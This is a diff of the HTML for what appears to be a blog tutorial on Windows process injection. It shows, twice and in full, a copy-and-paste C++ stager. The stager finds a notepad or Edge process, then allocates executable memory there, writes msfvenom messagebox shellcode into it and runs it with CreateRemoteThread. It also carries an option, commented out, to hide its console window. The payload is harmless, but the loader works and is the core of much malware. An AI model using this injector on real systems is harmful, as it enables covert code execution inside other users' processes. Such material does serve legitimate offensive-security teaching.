+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">BOOL <span style="color:#a6e22e">Inject</span>(DWORD dwPID, Shellcode shellcode) {
+    HANDLE hProcess <span style="color:#f92672">=</span> OpenProcess(PROCESS_VM_OPERATION <span style="color:#f92672">|</span> PROCESS_VM_WRITE <span style="color:#f92672">|</span> PROCESS_CREATE_THREAD, FALSE, dwPID);
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>hProcess) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>; };
+    
+    LPVOID pRemoteAddr <span style="color:#f92672">=</span> VirtualAllocEx(hProcess, NULL, shellcode.dwSize, (MEM_RESERVE <span style="color:#f92672">|</span> MEM_COMMIT), PAGE_EXECUTE_READ);
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pRemoteAddr) {
+        CloseHandle(hProcess);
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+    };
+
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>WriteProcessMemory(hProcess, pRemoteAddr, shellcode.pcData, shellcode.dwSize, NULL)) {
+        CloseHandle(hProcess);
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+    };
+
+    HANDLE hThread <span style="color:#f92672">=</span> CreateRemoteThread(hProcess, NULL, <span style="color:#ae81ff">0</span>, (LPTHREAD_START_ROUTINE)pRemoteAddr, NULL, <span style="color:#ae81ff">0</span>, NULL);
+    <span style="color:#66d9ef">if</span> (hThread <span style="color:#f92672">!=</span> NULL) {
+        WaitForSingleObject(hThread, <span style="color:#ae81ff">500</span>);
+
+        CloseHandle(hThread);
+        CloseHandle(hProcess);
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+    }
+
+    CloseHandle(hProcess);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>Combining all the code and adding the required includes,
 we get the code you can see below.
 You should be able to copy &amp; paste it to Visual Studio to get a stager
 that tries to pop a message box in either a notepad or Edge process
 (provided the process is 64bit):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;tlhelp32.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Shellcode</span> {
-</span></span><span style="display:flex;"><span>    BYTE<span style="color:#f92672">*</span> pcData;
-</span></span><span style="display:flex;"><span>    DWORD dwSize;
-</span></span><span style="display:flex;"><span>};
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>DWORD <span style="color:#a6e22e">GetTargetPID</span>();
-</span></span><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">GetShellcode</span>(Shellcode<span style="color:#f92672">*</span> shellcode);
-</span></span><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">Inject</span>(DWORD dwPID, Shellcode shellcode);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//::ShowWindow(::GetConsoleWindow(), SW_HIDE); // hide console window
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    
-</span></span><span style="display:flex;"><span>    DWORD pid <span style="color:#f92672">=</span> GetTargetPID();
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (pid <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>; }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Shellcode</span> shellcode;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>GetShellcode(<span style="color:#f92672">&amp;</span>shellcode)) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">2</span>; }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Injecting %ld bytes into PID %ld</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, shellcode.dwSize, pid);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Inject(pid, shellcode)) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">3</span>; }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// ------ Getting the shellcode ------ //
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// msfvenom -f c --arch x64 -p windows/x64/messagebox EXITFUNC=thread
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>BYTE aShellcode[] <span style="color:#f92672">=</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e\x4c\x8d</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x85\x2b\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x48\x65\x6c\x6c\x6f</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2c\x20\x66\x72\x6f\x6d\x20\x4d\x53\x46\x21\x00\x4d\x65\x73</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x73\x61\x67\x65\x42\x6f\x78\x00</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">GetShellcode</span>(Shellcode<span style="color:#f92672">*</span> shellcode) {
-</span></span><span style="display:flex;"><span>    (<span style="color:#f92672">*</span>shellcode).pcData <span style="color:#f92672">=</span> aShellcode;
-</span></span><span style="display:flex;"><span>    (<span style="color:#f92672">*</span>shellcode).dwSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(aShellcode);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// ------ Finding a target process ------ //
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span>DWORD <span style="color:#a6e22e">GetFirstPIDProclist</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">**</span> aszProclist, DWORD dwSize);
-</span></span><span style="display:flex;"><span>DWORD <span style="color:#a6e22e">GetFirstPIDProcname</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">*</span> szProcname);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>DWORD <span style="color:#a6e22e">GetTargetPID</span>() {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">*</span> aszProclist[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;notepad.exe&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;msedge.exe&#34;</span>
-</span></span><span style="display:flex;"><span>    };
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> GetFirstPIDProclist(aszProclist, <span style="color:#66d9ef">sizeof</span>(aszProclist) <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(aszProclist[<span style="color:#ae81ff">0</span>]));
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>DWORD <span style="color:#a6e22e">GetFirstPIDProclist</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">**</span> aszProclist, DWORD dwSize) {
-</span></span><span style="display:flex;"><span>    DWORD pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> dwSize; i<span style="color:#f92672">++</span>) {
-</span></span><span style="display:flex;"><span>        pid <span style="color:#f92672">=</span> GetFirstPIDProcname(aszProclist[i]);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (pid <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> pid;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>DWORD <span style="color:#a6e22e">GetFirstPIDProcname</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">*</span> szProcname) {
-</span></span><span style="display:flex;"><span>    HANDLE hProcessSnapshot <span style="color:#f92672">=</span> CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (INVALID_HANDLE_VALUE <span style="color:#f92672">==</span> hProcessSnapshot) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    PROCESSENTRY32 pe32;
-</span></span><span style="display:flex;"><span>    pe32.dwSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(PROCESSENTRY32);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Process32First(hProcessSnapshot, <span style="color:#f92672">&amp;</span>pe32)) {
-</span></span><span style="display:flex;"><span>        CloseHandle(hProcessSnapshot);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    DWORD pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (Process32Next(hProcessSnapshot, <span style="color:#f92672">&amp;</span>pe32)) {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (lstrcmpiW(szProcname, pe32.szExeFile) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
-</span></span><span style="display:flex;"><span>            pid <span style="color:#f92672">=</span> pe32.th32ProcessID;
-</span></span><span style="display:flex;"><span>            printf(<span style="color:#e6db74">&#34;Process found: %d %ls</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pid, pe32.szExeFile);
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    CloseHandle(hProcessSnapshot);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> pid;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// ------ Injecting into process ------ //
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">Inject</span>(DWORD dwPID, Shellcode shellcode) {
-</span></span><span style="display:flex;"><span>    HANDLE hProcess <span style="color:#f92672">=</span> OpenProcess(PROCESS_VM_OPERATION <span style="color:#f92672">|</span> PROCESS_VM_WRITE <span style="color:#f92672">|</span> PROCESS_CREATE_THREAD, FALSE, dwPID);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>hProcess) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>; };
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    LPVOID pRemoteAddr <span style="color:#f92672">=</span> VirtualAllocEx(hProcess, NULL, shellcode.dwSize, (MEM_RESERVE <span style="color:#f92672">|</span> MEM_COMMIT), PAGE_EXECUTE_READ);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pRemoteAddr) {
-</span></span><span style="display:flex;"><span>        CloseHandle(hProcess);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>    };
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>WriteProcessMemory(hProcess, pRemoteAddr, shellcode.pcData, shellcode.dwSize, NULL)) {
-</span></span><span style="display:flex;"><span>        CloseHandle(hProcess);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>    };
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    HANDLE hThread <span style="color:#f92672">=</span> CreateRemoteThread(hProcess, NULL, <span style="color:#ae81ff">0</span>, (LPTHREAD_START_ROUTINE)pRemoteAddr, NULL, <span style="color:#ae81ff">0</span>, NULL);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (hThread <span style="color:#f92672">!=</span> NULL) {
-</span></span><span style="display:flex;"><span>        WaitForSingleObject(hThread, <span style="color:#ae81ff">500</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        CloseHandle(hThread);
-</span></span><span style="display:flex;"><span>        CloseHandle(hProcess);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    CloseHandle(hProcess);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Time to make a message box appear on screen.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;tlhelp32.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+
+<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Shellcode</span> {
+    BYTE<span style="color:#f92672">*</span> pcData;
+    DWORD dwSize;
+};
+
+
+DWORD <span style="color:#a6e22e">GetTargetPID</span>();
+BOOL <span style="color:#a6e22e">GetShellcode</span>(Shellcode<span style="color:#f92672">*</span> shellcode);
+BOOL <span style="color:#a6e22e">Inject</span>(DWORD dwPID, Shellcode shellcode);
+
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+    <span style="color:#75715e">//::ShowWindow(::GetConsoleWindow(), SW_HIDE); // hide console window
+</span><span style="color:#75715e"></span>    
+    DWORD pid <span style="color:#f92672">=</span> GetTargetPID();
+    <span style="color:#66d9ef">if</span> (pid <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>; }
+
+    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Shellcode</span> shellcode;
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>GetShellcode(<span style="color:#f92672">&amp;</span>shellcode)) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">2</span>; }
+
+    printf(<span style="color:#e6db74">&#34;Injecting %ld bytes into PID %ld</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, shellcode.dwSize, pid);
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Inject(pid, shellcode)) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">3</span>; }
+
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#75715e">// ------ Getting the shellcode ------ //
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">// msfvenom -f c --arch x64 -p windows/x64/messagebox EXITFUNC=thread
+</span><span style="color:#75715e"></span>BYTE aShellcode[] <span style="color:#f92672">=</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e\x4c\x8d</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x85\x2b\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x48\x65\x6c\x6c\x6f</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2c\x20\x66\x72\x6f\x6d\x20\x4d\x53\x46\x21\x00\x4d\x65\x73</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x73\x61\x67\x65\x42\x6f\x78\x00</span><span style="color:#e6db74">&#34;</span>;
+
+BOOL <span style="color:#a6e22e">GetShellcode</span>(Shellcode<span style="color:#f92672">*</span> shellcode) {
+    (<span style="color:#f92672">*</span>shellcode).pcData <span style="color:#f92672">=</span> aShellcode;
+    (<span style="color:#f92672">*</span>shellcode).dwSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(aShellcode);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+}
+
+<span style="color:#75715e">// ------ Finding a target process ------ //
+</span><span style="color:#75715e"></span>
+DWORD <span style="color:#a6e22e">GetFirstPIDProclist</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">**</span> aszProclist, DWORD dwSize);
+DWORD <span style="color:#a6e22e">GetFirstPIDProcname</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">*</span> szProcname);
+
+DWORD <span style="color:#a6e22e">GetTargetPID</span>() {
+    <span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">*</span> aszProclist[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> {
+        <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;notepad.exe&#34;</span>,
+        <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;msedge.exe&#34;</span>
+    };
+    <span style="color:#66d9ef">return</span> GetFirstPIDProclist(aszProclist, <span style="color:#66d9ef">sizeof</span>(aszProclist) <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(aszProclist[<span style="color:#ae81ff">0</span>]));
+}
+
+DWORD <span style="color:#a6e22e">GetFirstPIDProclist</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">**</span> aszProclist, DWORD dwSize) {
+    DWORD pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> dwSize; i<span style="color:#f92672">++</span>) {
+        pid <span style="color:#f92672">=</span> GetFirstPIDProcname(aszProclist[i]);
+        <span style="color:#66d9ef">if</span> (pid <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
+            <span style="color:#66d9ef">return</span> pid;
+        }
+    }
+
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+DWORD <span style="color:#a6e22e">GetFirstPIDProcname</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">*</span> szProcname) {
+    HANDLE hProcessSnapshot <span style="color:#f92672">=</span> CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span style="color:#ae81ff">0</span>);
